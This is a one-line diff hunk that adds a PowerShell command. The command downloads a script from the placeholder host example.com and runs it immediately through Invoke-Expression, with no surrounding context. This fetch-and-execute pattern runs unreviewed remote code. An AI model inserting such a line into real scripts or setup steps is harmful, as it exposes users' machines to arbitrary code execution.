@@ -1,0 +1,1 @@
+iex (iwr 'https://example.com/secure_script.ps1' -UseBasicParsing)
